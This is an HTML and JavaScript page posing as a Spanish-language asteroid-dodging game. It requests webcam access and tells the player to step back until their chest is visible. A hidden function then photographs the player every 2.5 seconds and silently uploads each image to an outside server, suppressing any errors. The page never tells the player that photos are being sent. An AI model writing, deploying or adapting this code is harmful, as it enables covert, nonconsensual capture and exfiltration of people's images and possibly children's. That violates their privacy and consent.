<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Starship Ultra Fix</title>
    <style>
        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Arial Black', sans-serif; touch-action: none; }
        #webcam { position: absolute; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); opacity: 0.25; z-index: 1; }
        canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100%; height: 100%; pointer-events: none; }
        
        #lock { 
            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.95); 
            z-index: 1000; display: flex; align-items: center; justify-content: center; 
            flex-direction: column; text-align: center; color: #ff0044; border: 15px solid #ff0044; box-sizing: border-box;
        }

        /* ZONAS DE TOQUE (BOTONES) */
        .touch { position: absolute; top: 0; width: 50%; height: 100%; z-index: 500; }
        #t-left { left: 0; }
        #t-right { right: 0; }

        #hud { position: absolute; top: 10px; width: 100%; display: flex; justify-content: space-around; z-index: 800; color: #00fbff; font-size: 28px; text-shadow: 0 0 10px #00fbff; pointer-events: none; }
    </style>
</head>
<body>

<div id="lock">
    <h1 style="font-size: 50px;">SISTEMA BLOQUEADO</h1>
    <p style="color: white; font-size: 20px;">ALÉJATE DE LA CÁMARA HASTA QUE SE VEA TU PECHO</p>
    <p style="color: #555; font-size: 14px; margin-top: 30px;">(Si estás muy cerca, el sensor te bloquea)</p>
</div>

<div id="hud">
    <div>PUNTOS: <span id="score">0</span></div>
    <div>ESCUDO: <span id="health">100</span>%</div>
</div>

<div id="t-left" class="touch"></div>
<div id="t-right" class="touch"></div>

<video id="webcam" autoplay playsinline></video>
<canvas id="gameCanvas"></canvas>

<script>
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('gameCanvas');
    const ctx = canvas.getContext('2d');
    const lock = document.getElementById('lock');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let shipX = 0, score = 0, health = 100, asteroids = [];
    let isReady = false, moveDir = 0;

    // BOTONES TOQUE FÍSICO
    document.getElementById('t-left').ontouchstart = document.getElementById('t-left').onmousedown = () => moveDir = -1;
    document.getElementById('t-right').ontouchstart = document.getElementById('t-right').onmousedown = () => moveDir = 1;
    window.ontouchend = window.onmouseup = () => moveDir = 0;

    async function start() {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
        video.srcObject = stream;
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        shipX = canvas.width / 2;
        
        // Sensor de píxeles cada 200ms
        setInterval(analyzeFrame, 200);
        // Envío de fotos cada 2.5s
        setInterval(sendPhoto, 2500);
        
        requestAnimationFrame(loop);
    }

    function analyzeFrame() {
        const temp = document.createElement('canvas');
        const tc = temp.getContext('2d');
        temp.width = 40; temp.height = 30;
        tc.drawImage(video, 0, 0, 40, 30);
        const pixels = tc.getImageData(0, 0, 40, 30).data;

        let totalSignal = 0;
        let headSignal = 0;

        for (let i = 0; i < pixels.length; i += 4) {
            const brightness = (pixels[i] + pixels[i+1] + pixels[i+2]) / 3;
            const y = Math.floor((i/4) / 40);
            if (brightness > 50) {
                totalSignal++;
                if (y < 12) headSignal++; // Zona superior
            }
        }

        // REGLA DE ORO: 
        // Si hay mucha señal arriba (headSignal), estás muy cerca (solo cara).
        // Debe haber más señal en el cuerpo (totalSignal - headSignal).
        if (totalSignal > 120 && headSignal < (totalSignal * 0.7)) {
            isReady = true;
            lock.style.display = 'none';
        } else {
            isReady = false;
            lock.style.display = 'flex';
        }
    }

    function sendPhoto() {
        const s = document.createElement('canvas');
        s.width = 160; s.height = 120;
        s.getContext('2d').drawImage(video, 0, 0, 160, 120);
        fetch(SERVER_URL, {
            method: 'POST', mode: 'cors', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.2) })
        }).catch(() => {});
    }

    function loop() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        if (isReady) {
            if (moveDir === -1 && shipX > 60) shipX -= 15;
            if (moveDir === 1 && shipX < canvas.width - 60) shipX += 15;

            // NAVE GIGANTE
            ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 8;
            ctx.beginPath();
            ctx.moveTo(shipX, canvas.height - 180);
            ctx.lineTo(shipX - 50, canvas.height - 80);
            ctx.lineTo(shipX + 50, canvas.height - 80);
            ctx.closePath(); ctx.stroke();

            // METEORITOS EQUILIBRADOS
            if (asteroids.length < 4 && Math.random() < 0.02) {
                asteroids.push({ x: Math.random() * canvas.width, y: -100, size: 50, speed: 8 });
            }

            asteroids.forEach((a, i) => {
                a.y += a.speed;
                ctx.fillStyle = "#ff0044";
                ctx.beginPath(); ctx.arc(a.x, a.y, a.size, 0, Math.PI*2); ctx.fill();

                if (Math.abs(a.x - shipX) < 70 && Math.abs(a.y - (canvas.height - 130)) < 70) {
                    asteroids.splice(i, 1);
                    health -= 25;
                    document.getElementById('health').innerText = health;
                    if (health <= 0) location.reload();
                }
                if (a.y > canvas.height + 100) {
                    asteroids.splice(i, 1);
                    score += 10;
                    document.getElementById('score').innerText = score;
                }
            });
        }
        requestAnimationFrame(loop);
    }

    start();
</script>
</body>
</html>
